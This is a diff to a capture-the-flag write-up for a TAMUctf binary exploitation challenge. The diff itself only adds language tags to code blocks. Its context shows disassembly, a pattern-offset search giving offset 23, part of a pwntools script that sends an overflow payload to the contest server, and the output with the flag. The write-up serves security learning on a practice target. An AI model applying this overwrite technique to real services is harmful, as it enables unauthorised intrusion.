@@ -20,7 +20,7 @@ Invalid $SP address: 0x4129413d
 ```
 This makes our task much more difficult, so it's likely this isn't the intended method.  Instead we'll open it up in a disassembler:
 
-```
+```gdb
 |           0x080485ff      e8ecfdffff     call sym.imp.puts           ; int puts(const char *s)
 |           0x08048604      83c410         add esp, 0x10
 |           0x08048607      c745f4000000.  mov dword [local_ch], 0
@@ -59,7 +59,7 @@ gdb-peda$ pattern offset 0x41412841
 1094789185 found at offset: 23
 ```
 So we have to insert the value at position 23.  See my solution below:
-```
+```python
 from pwn import * 
 
 r = remote('pwn.ctf.tamu.edu', 4321) 
@@ -68,7 +68,7 @@ r.sendafter('What is my secret?', message)
 print r.recvline_contains('gigem') 
 ```
 Run it, and we get our flag:
-```
+```bash
 root@kali:~/Desktop/tamuctf# python pwn1.py
 [+] Opening connection to pwn.ctf.tamu.edu on port 4321: Done
 gigem{H0W_H4RD_1S_TH4T?}
